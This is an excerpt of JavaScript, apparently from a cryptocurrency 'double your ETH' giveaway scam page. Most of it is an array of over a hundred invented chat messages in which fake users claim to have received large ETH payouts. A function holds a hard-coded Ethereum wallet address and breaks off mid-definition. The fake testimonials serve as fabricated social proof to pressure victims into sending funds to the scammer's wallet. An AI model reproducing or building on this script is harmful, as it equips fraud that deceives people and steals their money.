...
(() => {
   ...
   let c = ["Never seen anyrhing like that, but lucky it worked! Thanks.", "Got 0.78 eth THANK YOU", "NEVER DOUBT THIS DISCORD SERVER", "HI!", "I GOT FUCKING 3.7 OMG", "IM IN!!", "this is insane +4.0", "VERY NICE GUYS", "Recieved 97 000 bucks in eth OMG I LOVE YOU THIS DISCORD TEAM!", "awesome offer can I use it 1 more time? I shouldve sent more...", "GOT 10", "wtf it worked", "May the God be with you.", "I was doubting for a long time if I should send here my 4 eth, but it actually worked for me so I got 8 eth now thanks to you guys.", "OH SHIT IT WORKS!!!!!!!", "thanks for 30 eth. fine here!", "OH FUCK I GOT THE RETURN ! THANKS", "Gracias papi", "9.34 eth", "crypto is a bubble...", "8 eth ON MY WALLET", "This is going to change my life!", "+240k", "HERE I AM, GOT $450k FUCKING INSANE THING!!!!!!", " WE LOVE YOU DISCORD SERVER AND I'M DEFINATELY INVITING MORE PEOPLE TO YOUR DISCORD!!!", "got 21 bits on my wallet now :)", "You better be fast guys!", "This Discord Server never dissapoints!!", "+12.44", "I sold all by eth a day ago ;(", "GOTTA BUY A BRAND NEW CHEVY!! 18 thousand bucks", "+78K$. this is an actual nonsence", "GENEROUS PRESENT!", "I was lucky to get my $200,000.", "I CANT IMAGINE WHAT WILL HAPPEN WITH THE PRICE", "GOD BLESSF YOU !", "Hell yeah got my 250,000,000 doubled! ", "wish i hsd more money to send... +1 of eth", "ONE TIME OPPORTUNITY ", "4.32 eth", "OHHHH COME HERE $$$$$$", "Thank you and your Discord Team! From me and my son.", "7.8 eth !", "eth INU TO 100k$", "BIG PUMP IS COMING", "Thank you for everything.", "WHAAAAAAT??", "3 eth", "got 30eth, not too much but thank you!", "I recieved 1.5 eth as well. This is a fine investment.", "Buterin CRYPTOKING!", "THANKS FOR THE NEW CAR", "God Bless your Discord Team!", "9.83 ye", "OH YES!", "+4.18", "eth TO THE MOON", "WOW", "+38.4K!!!!", "Your Discord Rocks", "I toke my chances and i'm glad", "can I have more?", "I AM HAPPY", "OH YESSS 311KK", "THANKS!", "+ 25eth", "HOW IS THIS POSSIBLE?", "Hello everyone!", "WHAT", "BUTERIN IS THE BEST", "How much left??????", "it took a couple of minutes but I got $13,000 ", "Really?", "BUTERIN IS THE KING!", "SpaceX launch soon?", "+ 20K bucks", "omg this is real!", "+13K", "I LOVE YOU ", "THATS GOOD!", "Got some!", "HEYYY", "MY GOD", "2eth? yeah", "how you doing guys? xD", "WOOOOOOOOW!!", "How can I contact your Discord team?", "Unbeliveable charity!", "GOT 7.27!!!!!!!!", "Thats greatful!", "Changed my mind on your Discord Server, you're heaven Saint. THANK YOU!", "5.34", "eth GOES 1mil$", "thanks much !!!!", "I want to participate again!!!!!!!!", "just recieved 41.9 eth", "Please give me some more!", "Very good.", "I CANT BELIEVE IT", "i actually got 5.64 eth back what the fuck?", "Tell your friends!", "+ 3.8", 'THAT"S BEAUTIFUL!', "GOT $200k OMG", "Too good!", "eth 4 LIFE", "I will remember this moment forever! Recieved 450,000", "Thank god Im on time", "THIS IS SICK!", "this is magic", "20,00 eth !!!", "Hi everyone :)", "HYPE!", "I love you forever guys!!", "I bless your Discord server!!", "+ eth 10.8", "thanks for letting me participate!", 'Should"ve deposited more....', "Hello!", "thanks for 22.4", "42.8 I CANT BELIVE MY EYES!!!!", "Im not gonna work again just trading :D", "OOOOMMMGG!!!!!!!!!!!!!!!!!", "Glad I figured all out! Now I got some money to invest.", "Thank god.", "LETS GO GUYS", "ETH $10k SOON", "+ 40.3 eth !", "Chill out", "I got 20.0 eth", "GOOD LUCK EVERYONE! I gotr my cut already", "SO HAPPY!", "omg recieved 400k backl!!!!!", "recieived some eth thanks", "Who else if not your Discord could help us ", "It's REal Guys!!", "+ 35.3874 eth", "YEAH BITCH", "Im very thankful", "NEW eth ATH COMING", "Perfect", "WE LOVE YOU", "HI", "I WISH I HAD MORE eth TO SEND", "+54.2", "Thats for real", "IT IS ACTUAL", "AWESOME", "7.4288", "eth GOES 100k$", "eth ROCKET"];
   ...
   function D() {
      ...
      let t = H(10),
         ...
         /*123456*/n = "0x403F7966B12352B803eB4D3d1DDaDe56c2729c61".substr(0, 10),
         i = function (e, t) {
            let o;
